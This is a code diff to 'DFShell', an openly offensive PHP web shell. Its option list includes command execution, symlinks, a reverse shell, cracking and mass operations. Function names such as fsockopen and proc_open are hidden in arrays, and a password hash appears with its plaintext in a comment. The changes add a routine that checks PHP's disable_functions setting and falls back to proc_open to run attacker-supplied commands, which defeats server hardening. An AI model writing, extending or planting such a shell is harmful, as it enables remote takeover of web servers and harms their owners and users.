@@ -20,7 +20,8 @@ session_start();
 $DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
-"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select"); // $GLOBALS['DFSyntax']
+"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
+$DFSCmd = array("shell_exec","system","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
 $DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren");
 
@@ -49,7 +50,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
+    static protected $remote_url = "http://localhost/css";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
@@ -410,6 +411,8 @@ class DFShell{
                 }
             break;
             case "cmd":
+                $slashtype = $this->DFSSlash();
+                $this->DFSCurrent($slashtype);
                 if(isset($GLOBALS['DFConfig'][0]['dfp'])){
                     $GLOBALS['DFSyntax'][3]($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
                 }else{
@@ -419,7 +422,7 @@ class DFShell{
                 echo "<section id='cmd_area'>";
                 echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && !empty($GLOBALS['DFConfig'][1]['dfscmd'])){
-                   system($GLOBALS['DFConfig'][1]['dfscmd']);
+                   $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
                 }
                 echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>Execute</button></form>";
                 echo "</section>";
@@ -799,6 +802,41 @@ class DFShell{
         }
     }
 
+    public function DFSExecute($command){
+        
+        if($this->DFSDat('ini','disable_functions')!=="None"){
+            $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
+            foreach($GLOBALS['DFSCmd'] as $cmd){
+                if(!in_array($cmd,$disCMD)){
+                    $availCMD = $cmd;
+                    break;
+                }
+            }
+            if($availCMD===$GLOBALS['DFSCmd'][4]){
+                return $this->DFSProcOpen($command);
+            }else{
+                return $availCMD;
+            }
+        }
+    }
+
+    private function DFSProcOpen($command){
+        $descriptorspec = array(
+            0 => array('pipe', 'r'), // shell can read from STDIN
+            1 => array('pipe', 'w'), // shell can write to STDOUT
+            2 => array('pipe', 'w')  // shell can write to STDERR
+        );
+        $exec = $command;
+        $process = $GLOBALS['DFSCmd'][4]($exec, $descriptorspec, $pipes, null, null);
+        
+        if(is_resource($process)){
+            $retCMD = $GLOBALS['DFSyntax'][14]($pipes[1]);
+            echo $retCMD;
+            proc_close($process);
+        }else{
+            echo "Fail to execute!";
+        }
+    }
     private function DFSWinPathCheck(){
         $partition = array("A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:",
         "N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:");
